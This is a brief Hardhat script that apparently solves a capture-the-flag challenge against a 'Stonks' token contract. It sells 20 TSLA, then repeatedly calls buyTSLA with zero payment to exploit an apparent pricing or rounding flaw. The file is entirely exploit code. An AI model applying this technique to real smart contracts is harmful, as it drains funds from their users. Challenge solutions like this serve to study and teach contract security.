import { ethers } from "hardhat";

const contractAddress = "0xa67B41f88159481195fa2733864Fbea38877CFa5";

async function main() {
  const [attacker] = await ethers.getSigners();
  const contract = (await ethers.getContractFactory("Stonks")).attach(contractAddress);

  let tx;
  tx = await contract.sellTSLA(20, 20 * 50);
  await tx.wait(1);

  let balance = await contract.balanceOf(attacker.address, 1);

  while (balance.gt(0)) {
    tx = await contract.buyTSLA(Math.min(49, balance.toNumber()), 0);
    await tx.wait(1);

    balance = await contract.balanceOf(attacker.address, 1);
  }
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
